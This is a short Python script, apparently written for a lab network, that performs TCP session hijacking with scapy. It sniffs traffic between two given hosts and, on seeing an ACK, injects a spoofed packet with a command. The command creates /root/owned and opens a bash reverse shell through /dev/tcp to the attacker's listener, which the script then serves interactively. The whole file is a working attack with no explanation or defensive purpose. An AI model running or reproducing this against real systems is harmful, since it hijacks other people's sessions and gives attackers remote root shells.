import sys
from scapy.all import *
from nclib import TCPServer

def pkt_handler(pkt):
        local_ip = get_if_addr("br-tcphijack")
        local_port = 5000

        if pkt[TCP].flags == "A":
                ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
                tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags)
                raw = Raw(load="mkdir /root/owned && bash -c 'exec bash -i &>/dev/tcp/{}/{} <&1' \n".format(local_ip, local_port))
                listener = TCPServer((local_ip, local_port))
                send(ip/tcp/raw, iface="br-tcphijack", verbose=0)

                for address in listener:
                     address.interact()

if __name__ == "__main__":
        src_addr = str(sys.argv[1])
        dst_addr = str(sys.argv[2])

        filter = "tcp and src host {} and dst host {}".format(src_addr, dst_addr)
        pkt = sniff(iface="br-tcphijack", filter=filter, prn=pkt_handler)

